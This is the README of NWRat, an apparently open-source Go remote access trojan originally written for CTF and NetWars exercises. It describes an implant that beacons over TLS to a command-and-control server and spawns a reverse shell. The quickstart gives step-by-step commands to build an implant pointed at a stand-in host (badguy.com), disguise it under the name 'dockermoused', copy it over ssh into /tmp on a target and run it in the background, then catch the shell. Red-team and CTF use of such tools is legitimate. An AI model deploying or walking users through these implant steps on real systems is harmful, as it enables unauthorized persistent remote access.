NWRat
=====
Barebones RAT which provides a shell over TLS.  Originally written several
years ago for SANS' NetWars, the source was lost and re-written for quite a
long CTF which was part of a job interview.

As an implant it's a single binary which tries to make a TLS connection to the
C2 server at a set interval.  If a connection is established, a shell is
spawned and its stdio hooked up the TLS connection.  Further connection
attempts are still made when a shell is running to enable multiple shells on
target (or for if you forget `-c` when you ping something).

As a C2 server it listens for a connection from the implant, does a TLS
handshake and proxies stdio to the connection.  The listening socket is closed
when a connection is accepted to enable catching multiple callbacks.

Features:
- Single binary for both implant and server
- Shell over TLS
- Constant beacons
- No fussing about with someone else's post-exploitation code
- Compile-time implant configuration
- Cross-platform (though, only if `/bin/sh` exists on the platform)
- Encrypted on the wire
- Easy to set up and use
- Documentation which assumes some familiarity with [Go](https://golang.org)

For legal use only.

Quickstart
----------
```sh
# Get the source
go get github.com/magisterquis/nwrat
# Build the C2 server for the local platform
go build github.com/magisterquis/nwrat
# Build an implant for a different platform, setting the callback address
GOOS=linux go build -o dockermoused -ldflags="-X main.callbackAddr=badguy.com:4443" github.com/magisterquis/nwrat
# Put the implant on target it and run it
ssh target 'cat >/tmp/dockermoused && chmod 0700 /tmp/dockermoused && /tmp/dockermoused &' <./dockermoused
# Catch a callback
./nwrat -listen localhost:4443 -cert ./badguy.com.crt -key ./badguy.com.key
```

Implant
-------
The implant is configured using Go linker directives.  There are three options:

Option                | Default           | Description
----------------------|-------------------|------------
main.callbackInterval | `1m`              | Callback interval, in Go's parseable duration [syntax](https://golang.org/pkg/time/#ParseDuration)
main.callbackAddr     | `example.com:443` | Callback address and port
main.implantDebug     | _unset_           | Set to any string to have the implant print debugging messages

As an example, to have the implant call back to `kittens.com:4433` every three
seconds and print debugging output, it would be built something like

```sh
go build -ldflags="-X main.callbackInterval=3s -X main.callbackAddr=kittens.com:4433 -X main.implantDebug=sure" github.com/magisterquis/nwrat
```

Editing the `var` block at the top also works.

Running the binary with no arguments causes it to function as the implant (as
opposed to the C2 server).

C2 Server
---------
When used with `-listen` the binary catches a callback.  A listen address and TLS
certificate and key corresponding to the domain the implant expects need to be
supplied via command-line options, similar to

```sh
./nwrat -listen 0.0.0.0:4443 -cert ./badguy.com.crt -key ./badguy.com.key
```

It's not a bad idea to wrap `nwrat` in [rlwrap](https://github.com/hanslub42/rlwrap)
or something similar, as there'll be no TTY or readline library.

When one side or the other disconnects, a message similar to
```
2020/07/22 00:28:25 Sent 206 bytes to implant
```
will be logged.

Windows
-------
At the moment, the C2 side should work just fine, but the implant won't be able
to start `/bin/sh`.  Feel free to submit a pull request.
